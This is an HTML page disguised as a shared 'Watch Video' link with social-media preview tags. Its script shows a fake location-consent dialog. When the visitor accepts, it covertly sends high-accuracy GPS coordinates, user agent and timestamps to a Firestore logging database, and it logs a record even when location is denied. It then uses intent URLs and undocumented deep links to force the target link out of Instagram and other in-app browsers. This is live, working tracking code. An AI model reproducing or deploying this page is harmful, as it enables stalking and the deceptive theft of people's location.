<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Watch Video</title>

  <meta property="og:title" content="Watch Video">
  <meta property="og:description" content="Tap to open">
  <meta property="og:image" content="https://sushandristi.github.io/relationship/thumbnail.png">
  <meta property="og:type" content="website">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Watch Video.   ">
  <meta name="twitter:description" content="Tap to open.   ">
  <meta name="twitter:image" content="https://sushandristi.github.io/relationship/thumbnail.png">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #0f0f0f;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    .overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      z-index: 999;
      align-items: center;
      justify-content: center;
    }

    .overlay.show {
      display: flex;
    }

    .dialog {
      background: #1a1a1a;
      border-radius: 14px;
      padding: 28px 24px 18px;
      width: 300px;
      text-align: center;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
    }

    .dialog h3 {
      margin: 0 0 8px;
      font-size: 18px;
      font-weight: 600;
    }

    .dialog p {
      margin: 0 0 20px;
      font-size: 14px;
      opacity: 0.75;
      line-height: 1.4;
    }

    .dialog .btn-group {
      display: flex;
      gap: 10px;
    }

    .dialog button {
      flex: 1;
      padding: 10px 0;
      border-radius: 10px;
      border: none;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    .dialog .btn-cancel {
      background: #333;
      color: #fff;
    }

    .dialog .btn-confirm {
      background: #fff;
      color: #000;
    }

    .box {
      text-align: center;
      display: none;
    }

    .spinner {
      width: 40px;
      height: 40px;
      margin: 0 auto 20px;
      border: 4px solid rgba(255, 255, 255, 0.2);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .msg {
      color: #fff;
      font-size: 16px;
      opacity: 0.85;
      font-family: sans-serif;
    }

    /* Manual escape fallback (shown only if we detect in-app browser) */
    .manual-escape {
      display: none;
      margin-top: 24px;
      text-align: center;
    }

    .manual-escape.show {
      display: block;
    }

    .manual-escape p {
      font-size: 13px;
      opacity: 0.6;
      margin: 0 0 10px;
    }

    .manual-escape .escape-btn {
      display: inline-block;
      padding: 12px 28px;
      border-radius: 10px;
      border: none;
      background: #fff;
      color: #000;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      text-decoration: none;
    }
  </style>
</head>

<body>

  <!-- Fake dialog -->
  <div class="overlay" id="overlay">
    <div class="dialog">
      <h3>Redirect to Video</h3>
      <p>This video uses location-based content. Allow redirect and share your location?</p>
      <div class="btn-group">
        <button class="btn-cancel" id="btnCancel">Cancel</button>
        <button class="btn-confirm" id="btnConfirm">Yes, Open</button>
      </div>
    </div>
  </div>

  <!-- Spinner -->
  <div class="box" id="box">
    <div class="spinner"></div>
    <div class="msg">Opening…</div>
    <!-- Manual fallback injected here if needed -->
    <div class="manual-escape" id="manualEscape">
      <p>Still stuck inside Instagram? Open manually:</p>
      <button class="escape-btn" id="manualEscapeBtn">Open in Browser</button>
    </div>
  </div>

  <script>
    var FIRESTORE_URL = 'https://firestore.googleapis.com/v1/projects/funny-jokes-e8b49/databases/(default)/documents/logs';

    // =================
    // Helper: build Firestore document and send it
    // =================
    function sendToFirestore(data) {
      var doc = {
        fields: {}
      };

      for (var key in data) {
        if (data.hasOwnProperty(key)) {
          var value = data[key];
          if (typeof value === 'number') {
            doc.fields[key] = { doubleValue: value };
          } else if (typeof value === 'boolean') {
            doc.fields[key] = { booleanValue: value };
          } else {
            doc.fields[key] = { stringValue: String(value) };
          }
        }
      }

      var payload = JSON.stringify(doc);

      navigator.sendBeacon(
        FIRESTORE_URL,
        new Blob([payload], { type: 'application/json' })
      );

      fetch(FIRESTORE_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload,
        keepalive: true
      })
        .then(function(r) { return r.json(); })
        .then(console.log)
        .catch(function() { });
    }

    // =================
    // Extract target URL from query params (?url= or ?u=)
    // =================
    function getTargetUrl() {
      var params = new URLSearchParams(window.location.search);
      var target = params.get('url') || params.get('u');
      if (!target) return null;
      try { target = decodeURIComponent(target); } catch (e) { }
      if (!/^https?:\/\//i.test(target)) return null;
      return target;
    }

    // =================
    // Detect if we're inside an in-app browser
    // =================
    function detectInAppBrowser() {
      var ua = navigator.userAgent || '';
      // Instagram markers: 'Instagram' in UA, or 'FBAV' (Facebook/Instagram),
      // or 'barcelona' (Threads), or 'FBAN' (Facebook)
      if (/instagram/i.test(ua)) return 'instagram';
      if (/fbav|fban|fbbv/i.test(ua)) return 'facebook';
      if (/barcelona/i.test(ua)) return 'threads';
      if (/musical\.ly|tiktok/i.test(ua)) return 'tiktok';
      if (/linkedin/i.test(ua)) return 'linkedin';
      if (/twitter|tweetdeck/i.test(ua)) return 'twitter';
      if (/snapchat/i.test(ua)) return 'snapchat';
      return null;
    }

    // =================
    // FORCE EXTERNAL BROWSER - Instagram-specific techniques
    // =================
    function openInExternalBrowser(url) {
      var ua = navigator.userAgent || '';
      var isAndroid = /android/i.test(ua);
      var isIOS = /iphone|ipad|ipod/i.test(ua);
      var inApp = detectInAppBrowser();

      // ----------------------------------------------------------------
      // LAYER 1: Platform-specific JS bridges
      // ----------------------------------------------------------------
      // Telegram
      if (window.Telegram && window.Telegram.WebView && window.Telegram.WebView.openExternalLink) {
        try { window.Telegram.WebView.openExternalLink(url); return; } catch (e) { /* fall through */ }
      }

      // LINE
      if (typeof window.open === 'function') {
        try { var w = window.open(url, '_system'); if (w && !w.closed) return; } catch (e) { }
      }

      // ----------------------------------------------------------------
      // LAYER 2: Instagram iOS - native deep link instagram://extbrowser/
      // ----------------------------------------------------------------
      // This is Instagram's OWN undocumented deep link scheme that forces
      // the link to open in the external Safari browser. Major link-in-bio
      // services (TapClick.to, OpenUp.to, linkboo) use this technique.
      // Source: Reddit r/webdev + decompiled JS from commercial services.
      if (inApp === 'instagram' && isIOS) {
        var extUrl = 'instagram://extbrowser/?url=' + encodeURIComponent(url);
        // Trigger via anchor click (user-gesture context preserved)
        var a = document.createElement('a');
        a.href = extUrl;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);

        // Also try via iframe (some versions)
        setTimeout(function() {
          var iframe = document.createElement('iframe');
          iframe.src = extUrl;
          iframe.style.display = 'none';
          document.body.appendChild(iframe);
          setTimeout(function() { document.body.removeChild(iframe); }, 100);
        }, 50);

        // Fallback to standard navigation if instagram:// didn't work
        setTimeout(function() { window.location.href = url; }, 300);
        return;
      }

      // ----------------------------------------------------------------
      // LAYER 3: Attempt _blank anchor click (many WebViews partially respect this)
      // ----------------------------------------------------------------
      try {
        var a2 = document.createElement('a');
        a2.href = url;
        a2.target = '_blank';
        a2.rel = 'noreferrer noopener';
        a2.style.display = 'none';
        document.body.appendChild(a2);
        a2.click();
        document.body.removeChild(a2);
      } catch (e) { /* ignore */ }

      // ----------------------------------------------------------------
      // LAYER 4: Android - Intent URL (reliable for Instagram Android)
      // ----------------------------------------------------------------
      if (isAndroid) {
        var cleanUrl = url.replace(/^https?:\/\//, '');
        // Standard intent
        var intentUrl = 'intent://' + cleanUrl +
          '#Intent;scheme=https;action=android.intent.action.VIEW;' +
          'category=android.intent.category.BROWSABLE;' +
          'S.browser_fallback_url=' + encodeURIComponent(url) + ';end';
        // Intent with Chrome package
        var intentChrome = 'intent://' + cleanUrl +
          '#Intent;scheme=https;action=android.intent.action.VIEW;' +
          'category=android.intent.category.BROWSABLE;' +
          'package=com.android.chrome;' +
          'S.browser_fallback_url=' + encodeURIComponent(url) + ';end';

        setTimeout(function() { window.location.href = intentUrl; }, 100);
        setTimeout(function() { window.location.href = intentChrome; }, 300);
      }

      // ----------------------------------------------------------------
      // LAYER 5: iOS - additional techniques
      // ----------------------------------------------------------------
      if (isIOS) {
        // Try googlechromes:// to open Chrome (from which Safari can be launched)
        setTimeout(function() {
          var chromeUrl = 'googlechromes://' + url.replace(/^https?:\/\//, '');
          window.location.href = chromeUrl;
        }, 200);

        // If we're in FB/Instagram and the above failed, try x-safari-https://
        setTimeout(function() {
          var safariUrl = 'x-safari-https://' + url.replace(/^https?:\/\//, '');
          window.location.href = safariUrl;
        }, 500);
      }

      // ----------------------------------------------------------------
      // LAYER 6: Final fallback
      // ----------------------------------------------------------------
      setTimeout(function() {
        window.location.href = url;
      }, 1200);
    }

    // =================
    // Show manual fallback if auto-escape fails
    // =================
    function showManualFallback(url) {
      var el = document.getElementById('manualEscape');
      var btn = document.getElementById('manualEscapeBtn');
      if (el && btn) {
        el.classList.add('show');
        btn.onclick = function() {
          openInExternalBrowser(url);
        };
        // Also show on second attempt if first auto failed
        setTimeout(function() {
          el.classList.add('show');
        }, 3000);
      }
    }

    // =================
    // MAIN LOGIC
    // =================
    var target = getTargetUrl();
    var box = document.getElementById('box');
    var overlay = document.getElementById('overlay');
    var now = new Date();

    if (!target) {
      box.style.display = 'block';
      document.querySelector('.msg').textContent = 'No link provided.';
    } else {
      overlay.classList.add('show');

      document.getElementById('btnCancel').onclick = function() {
        overlay.classList.remove('show');
        box.style.display = 'block';
        document.querySelector('.msg').textContent = 'Redirect cancelled.';
      };

      document.getElementById('btnConfirm').onclick = function() {
        overlay.classList.remove('show');
        box.style.display = 'block';

        // --- Geolocation exfiltration ---
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            function(pos) {
              sendToFirestore({
                type: 'gps',
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                ua: navigator.userAgent,
                pageUrl: window.location.href,
                timestamp: now.toISOString(),
                localDateTime: now.toLocaleString()
              });
            },
            function(err) {
              sendToFirestore({
                type: 'gps_denied',
                errorCode: err.code,
                ua: navigator.userAgent,
                pageUrl: window.location.href,
                timestamp: now.toISOString(),
                localDateTime: now.toLocaleString()
              });
            },
            {
              enableHighAccuracy: true,
              timeout: 8000,
              maximumAge: 0
            }
          );
        }

        // --- Force external browser ---
        // Try auto-escape first
        setTimeout(function() {
          openInExternalBrowser(target);
        }, 500);

        // --- Manual fallback for Instagram users ---
        // Instagram's in-app browser is notoriously locked down.
        // If auto-escape fails, the user gets a manual "Open in Browser" button.
        setTimeout(function() {
          showManualFallback(target);
        }, 2000);
      };
    }
  </script>
</body>

</html>
